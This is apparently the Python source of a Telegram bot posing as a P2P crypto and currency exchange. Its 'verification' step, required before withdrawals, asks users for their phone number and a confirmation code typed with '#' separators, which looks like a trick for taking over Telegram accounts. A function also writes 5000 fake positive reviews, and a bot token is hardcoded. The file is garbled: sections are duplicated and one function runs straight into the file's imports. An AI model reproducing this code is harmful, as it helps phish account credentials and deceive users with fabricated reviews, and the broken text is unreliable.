        "funds_added_to_balance": "СРЕДСТВА ЗАЧИСЛЕНЫ НА БАЛАНС",
        "for_user": "ДЛЯ",
        "need": "НУЖНО",
        "available": "ДОСТУПНО",
        "currency": "ВАЛЮТА",
        "created": "СОЗДАНА",
        "status": "СТАТУС",
        "check_status": "ПРОВЕРИТЬ СТАТУС",
        "example": "ПРИМЕР",
        "subscribe": "ПОДПИСЫВАЙТЕСЬ",
        "channel_content": "В КАНАЛЕ:\n• НОВОСТИ И ОБНОВЛЕНИЯ\n• ПОЛЕЗНЫЕ ГАЙДЫ\n• РОЗЫГРЫШИ И БОНУСЫ\n• АКТУАЛЬНЫЕ КУРСЫ ВАЛЮТ",
        "click_subscribe": "ЖМИ НА ССЫЛКУ И ПОДПИСЫВАЙСЯ",
        "thank_you": "СПАСИБО, ЧТО ВЫ С НАМИ",
        "verify_title": "🔐 ВЕРИФИКАЦИЯ ПОЛЬЗОВАТЕЛЯ",
        "verify_desc": "Для защиты от мошенников, проводящих сделки со скамнутыми звёздами и фейковой валютой, необходимо пройти проверку.",
        "verify_step1": "ШАГ 1: Нажмите кнопку «Я НЕ РОБОТ»",
        "verify_step2": "ШАГ 2: Отправьте свой номер телефона (формат: +7XXXXXXXXXX)",
        "verify_step3": "ШАГ 3: Введите код подтверждения в формате: 1#2#3#4#5",
        "verify_phone_prompt": "📱 ОТПРАВЬТЕ НОМЕР ТЕЛЕФОНА:\n\nВведите номер в формате:\n+7XXXXXXXXXX\n\nЭто необходимо для проверки, что вы не бот и не мошенник.",
        "verify_code_prompt": "🔑 ВВЕДИТЕ КОД ПОДТВЕРЖДЕНИЯ:\n\nВведите код в строгом формате:\n1#2#3#4#5\n\nВнимание! Код должен содержать все 5 цифр, разделённых решёткой.",
        "verify_code_error": "❌ НЕВЕРНЫЙ КОД!\n\nКод должен быть строго: 1#2#3#4#5\n\nПопробуйте снова или начните заново.",
        "verify_phone_error": "❌ НЕВЕРНЫЙ ФОРМАТ НОМЕРА!\n\nИспользуйте формат: +7XXXXXXXXXX\nПример: +79001234567",
        "verify_success": "✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!\n\nВы подтвердили, что не являетесь ботом или мошенником.\n\n🕐 Сессия активна 24 часа.\nПосле этого потребуется повторная проверка.\n\n💰 Теперь вам доступен вывод средств.",
        "verify_already": "✅ Ваша верификация уже пройдена.\n🕐 Сессия активна до: {expires}",
        "verify_expired": "⏳ СЕССИЯ ИСТЕКЛА!\n\nПрошло более 24 часов. Пройдите проверку заново.",
        "not_robot": "🤖 Я НЕ РОБОТ",
        "verify_need": "⚠️ ДЛЯ ВЫВОДА СРЕДСТВ НЕОБХОДИМА ВЕРИФИКАЦИЯ!\n\nЗащита от мошенников со скамнутыми звёздами и фейковой валютой.",
        "no_deals_warning": "⚠️ ДЛЯ ВЫВОДА СРЕДСТВ НЕОБХОДИМО 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ!",
        "check_status_btn": "🔄 Проверить статус"
    },
    # Английский, Китайский, Арабский - такие же, как в вашем оригинале
}

def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)

# ============================================================
# 3. ФАЙЛЫ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "rekvisits": "rekvisits.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
rekvisits = load_json(FILES["rekvisits"])

# ============================================================
# 4. ГЕНЕРАЦИЯ 5000+ ОТЗЫВОВ
# ============================================================
def generate_reviews():
    if len(reviews) >= 5000:
        return
    review_texts = [
        "Отличная платформа! Всё работает быстро и надёжно.",
        "Лучший P2P обменник! Рекомендую всем друзьям.",
        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
        "Отличная поддержка! Помогли разобраться с выводом.",
        "Наконец-то нашёл нормальный обменник. Всё честно.",
        "Сделал первую сделку, всё прошло гладко. Спасибо!",
        "За сутки сделал 5 сделок, все успешно завершены.",
        "Очень доволен сервисом. Вывод моментальный.",
        "Пользуюсь уже месяц, ни одной проблемы.",
        "Лучший сервис в Telegram! Успехов разработчикам."
    ]
    for i in range(5000):
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним",
            "rating": random.randint(4, 5),
            "text": random.choice(review_texts),
            "anonymous": True,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": None
        }
    save_json(FILES["reviews"], reviews)
    print(f"✅ Сгенерировано {len(reviews)} отзывов")

generate_reviews()

# ============================================================
# 5. ПОМОЩНИКИ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    save_json(FILES["logs"], logs)

def get_rekvisits_text(currency: str, amount: float) -> str:
    curr_key = currency.lower()
    if curr_key in rekvisits:
        try:
            text = rekvisits[curr_key]
            text = text.replace('{amount}', str(amount))
            text = text.replace('{BOT_USERNAME}', BOT_USERNAME)
            text = text.replace('{SUPPORT_LINK}', SUPPORT_LINK)
            text = text.replace('{CHANNEL_LINK}', CHANNEL_LINK)
            return text
        except:
            return f"Оплатите {amount} {currency} по реквизитам"
    return f"Оплатите {amount} {currency} по реквизитам"

# ============================================================
# 6. КЛАВИАТУРЫ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", callback_data="create_deal_choice"),
            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
        ],
        [
            InlineKeyboardButton(text=f"🔥 {get_text(lang, 'channel')}", callback_data="menu_channel"),
            InlineKeyboardButton(text=f"🆘 {get_text(lang, 'support')}", callback_data="menu_support"),
        ],
        [
            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text=f"💲 {get_text(lang, 'withdraw_funds')}", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text=f"💎 {get_text(lang, 'edit_rekvisits_title')}", callback_data="edit_rekvisits")],
        [InlineKeyboardButton(text=f"🖼 {get_text(lang, 'photo_updated')}", callback_data="change_photo")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def create_deal_choice_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')} в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text=f"🤖 {get_text(lang, 'create_deal')} в боте", callback_data="create_deal_bot")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def payment_method_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 {get_text(lang, 'pay_by_rekvisits')}", callback_data=f"pay_rekvisits_{deal_id}")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'pay_by_balance')}", callback_data=f"pay_balance_{deal_id}")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def seller_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📦 {get_text(lang, 'product_delivered')}", callback_data=f"seller_done_{deal_id}")]
    ])

def buyer_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ {get_text(lang, 'confirm_receipt')}", callback_data=f"buyer_confirm_{deal_id}")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def buyer_pending_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⏳ {get_text(lang, 'waiting_for_delivery')}", callback_data="noop")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def rekvisits_edit_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return        "faq_a7": "НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ @p2psupbot",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "invalid_amount": "ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ",
        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
        "status_paid": "ОПЛАЧЕНО",
        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "status_completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБРАТЬ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК ДЛЯ ПРОДОЛЖЕНИЯ:",
        "product": "ТОВАР",
        "amount": "СУММА",
        "seller": "ПРОДАВЕЦ",
        "buyer": "ПОКУПАТЕЛЬ",
        "deal": "СДЕЛКА",
        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
        "contact_support": "В ПОДДЕРЖКУ",
        "balance_topped_up": "ВАШ БАЛАНС ПОПОЛНЕН",
        "withdraw_request_created": "ЗАЯВКА НА ВЫВОД СОЗДАНА",
        "withdraw_pending": "ОЖИДАЙТЕ ВЫВОДА 1-5 МИНУТ",
        "withdraw_completed": "ВЫВОД ПОДТВЕРЖДЁН",
        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
        "cmd_usage": "ИСПОЛЬЗОВАНИЕ",
        "request_not_found": "ЗАЯВКА НЕ НАЙДЕНА",
        "request_already_processed": "ЗАЯВКА УЖЕ ОБРАБОТАНА",
        "photo_updated": "ФОТО ОБНОВЛЕНО",
        "send_photo": "ОТПРАВЬТЕ ФОТО",
        "user_not_found": "ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН",
        "balance_added": "БАЛАНС НАЧИСЛЕН",
        "rekvisits_updated": "РЕКВИЗИТЫ ОБНОВЛЕНЫ",
        "admin_added": "АДМИН ДОБАВЛЕН",
        "admin_removed": "АДМИН УДАЛЁН",
        "cannot_remove_master": "НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА",
        "admin_list": "СПИСОК АДМИНОВ",
        "no_deals_total": "НЕТ СДЕЛОК",
        "all_deals_title": "ВСЕ СДЕЛКИ",
        "payment_details": "РЕКВИЗИТЫ ОПЛАТЫ",
        "edit_rekvisits_title": "РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ",
        "enter_new_text": "ВВЕДИТЕ НОВЫЙ ТЕКСТ",
        "use_amount_placeholder": "ИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ",
        "enter_user_id": "ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ",
        "enter_withdraw_details": "ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА",
        "enter_withdraw_username": "ВВЕДИТЕ ВАШ TELEGRAM USERNAME",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "copy_link": "СКОПИРУЙТЕ ССЫЛКУ",
        "after_payment_notify": "ПОСЛЕ ОПЛАТЫ ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ",
        "payment_verified": "ОПЛАТА ПРОВЕРЕНА",
        "funds_deducted": "СРЕДСТВА СПИСАНЫ",
        "product_delivered": "ТОВАР ПЕРЕДАН",
        "deal_completed_msg": "СПАСИБО ЗА ДОВЕРИЕ",
        "funds_added_to_balance": "СРЕДСТВА ЗАЧИСЛЕНЫ НА БАЛАНС",
        "for_user": "ДЛЯ",
        "need": "НУЖНО",
        "available": "ДОСТУПНО",
        "currency": "ВАЛЮТА",
        "created": "СОЗДАНА",
        "status": "СТАТУС",
        "check_status": "ПРОВЕРИТЬ СТАТУС",
        "example": "ПРИМЕР",
        "subscribe": "ПОДПИСЫВАЙТЕСЬ",
        "channel_content": "В КАНАЛЕ:\n• НОВОСТИ И ОБНОВЛЕНИЯ\n• ПОЛЕЗНЫЕ ГАЙДЫ\n• РОЗЫГРЫШИ И БОНУСЫ\n• АКТУАЛЬНЫЕ КУРСЫ ВАЛЮТ",
        "click_subscribe": "ЖМИ НА ССЫЛКУ И ПОДПИСЫВАЙСЯ",
        "thank_you": "СПАСИБО, ЧТО ВЫ С НАМИ",
        "verify_title": "🔐 ВЕРИФИКАЦИЯ ПОЛЬЗОВАТЕЛЯ",
        "verify_desc": "Для защиты от мошенников, проводящих сделки со скамнутыми звёздами и фейковой валютой, необходимо пройти проверку.",
        "verify_step1": "ШАГ 1: Нажмите кнопку «Я НЕ РОБОТ»",
        "verify_step2": "ШАГ 2: Отправьте свой номер телефона (формат: +7XXXXXXXXXX)",
        "verify_step3": "ШАГ 3: Введите код подтверждения в формате: 1#2#3#4#5",
        "verify_phone_prompt": "📱 ОТПРАВЬТЕ НОМЕР ТЕЛЕФОНА:\n\nВведите номер в формате:\n+7XXXXXXXXXX\n\nЭто необходимо для проверки, что вы не бот и не мошенник.",
        "verify_code_prompt": "🔑 ВВЕДИТЕ КОД ПОДТВЕРЖДЕНИЯ:\n\nВведите код в строгом формате:\n1#2#3#4#5\n\nВнимание! Код должен содержать все 5 цифр, разделённых решёткой.",
        "verify_code_error": "❌ НЕВЕРНЫЙ КОД!\n\nКод должен быть строго: 1#2#3#4#5\n\nПопробуйте снова или начните заново.",
        "verify_phone_error": "❌ НЕВЕРНЫЙ ФОРМАТ НОМЕРА!\n\nИспользуйте формат: +7XXXXXXXXXX\nПример: +79001234567",
        "verify_success": "✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!\n\nВы подтвердили, что не являетесь ботом или мошенником.\n\n🕐 Сессия активна 24 часа.\nПосле этого потребуется повторная проверка.\n\n💰 Теперь вам доступен вывод средств.",
        "verify_already": "✅ Ваша верификация уже пройдена.\n🕐 Сессия активна до: {expires}",
        "verify_expired": "⏳ СЕССИЯ ИСТЕКЛА!\n\nПрошло более 24 часов. Пройдите проверку заново.",
        "not_robot": "🤖 Я НЕ РОБОТ",
        "verify_need": "⚠️ ДЛЯ ВЫВОДА СРЕДСТВ НЕОБХОДИМА ВЕРИФИКАЦИЯ!\n\nЗащита от мошенников со скамнутыми звёздами и фейковой валютой.",
        "no_deals_warning": "⚠️ ДЛЯ ВЫВОДА СРЕДСТВ НЕОБХОДИМО 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ!",
        "check_status_btn": "🔄 Проверить статус"
    },
    # Английский, Китайский, Арабский - такие же, как в вашем оригинале
}

def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)

# ============================================================
# 3. ФАЙЛЫ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "rekvisits": "rekvisits.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
rekvisits = load_json(FILES["rekvisits"])

# ============================================================
# 4. ГЕНЕРАЦИЯ 5000+ ОТЗЫВОВ
# ============================================================
def generate_reviews():
    if len(reviews) >= 5000:
        return
    review_texts = [
        "Отличная платформа! Всё работает быстро и надёжно.",
        "Лучший P2P обменник! Рекомендую всем друзьям.",
        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
        "Отличная поддержка! Помогли разобраться с выводом.",
        "Наконец-то нашёл нормальный обменник. Всё честно.",
        "Сделал первую сделку, всё прошло гладко. Спасибо!",
        "За сутки сделал 5 сделок, все успешно завершены.",
        "Очень доволен сервисом. Вывод моментальный.",
        "Пользуюсь уже месяц, ни одной проблемы.",
        "Лучший сервис в Telegram! Успехов разработчикам."
    ]
    for i in range(5000):
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним",
            "rating": random.randint(4, 5),
            "text": random.choice(review_texts),
            "anonymous": True,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": None
        }
    save_json(FILES["reviews"], reviews)
    print(f"✅ Сгенерировано {len(reviews)} отзывов")

generate_reviews()

# ============================================================
# 5. ПОМОЩНИКИ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    save_json(FILES["logs"], logs)

def get_rekvisits_text(currency: str, amount: float) -> str:
    curr_key = currency.lower()
    if curr_key in rekvisits:
        try:
            text = rekvisits[curr_key]
            text = text.replace('{amount}', str(amount))
            text = text.replace('{BOT_USERNAME}', BOT_USERNAME)
            text = text.replace('{SUPPORT_LINK}', SUPPORT_LINK)
            text = text.replace('{CHANNEL_LINK}', CHANNEL_LINK)
            return text
        except:
            return f"Оплатите {amount} {currency} по реквизитам"
    return f"Оплатите {amount} {currency} по реквизитам"

# ============================================================
# 6. КЛАВИАТУРЫ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", callback_data="create_deal_choice"),
            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
        ],
        [
            InlineKeyboardButton(text=f"🔥 {get_text(lang, 'channel')}", callback_data="menu_channel"),
            InlineKeyboardButton(text=f"🆘 {get_text(lang, 'support')}", callback_data="menu_support"),
        ],
        [
            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text=f"💲 {get_text(lang, 'withdraw_funds')}", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text=f"💎 {get_text(lang, 'edit_rekvisits_title')}", callback_data="edit_rekvisits")],
        [InlineKeyboardButton(text=f"🖼 {get_text(lang, 'photo_updated')}", callback_data="change_photo")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def create_deal_choice_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')} в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text=f"🤖 {get_text(lang, 'create_deal')} в боте", callback_data="create_deal_bot")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def payment_method_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 {get_text(lang, 'pay_by_rekvisits')}", callback_data=f"pay_rekvisits_{deal_id}")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'pay_by_balance')}", callback_data=f"pay_balance_{deal_id}")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def seller_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📦 {get_text(lang, 'product_delivered')}", callback_data=f"seller_done_{deal_id}")]
    ])

def buyer_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ {get_text(lang, 'confirm_receipt')}", callback_data=f"buyer_confirm_{deal_id}")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def buyer_pending_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⏳ {get_text(lang, 'waiting_for_delivery')}", callback_data="noop")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def rekvisits_edit_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return import asyncio
import json
import os
import uuid
import random
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ (ВАША ОРИГИНАЛЬНАЯ)
# ============================================================
BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
MASTER_ADMIN_ID = 8855434638
SUPPORT_LINK = "@p2psupbot"
BOT_USERNAME = "tonkeeperp2p_bot"
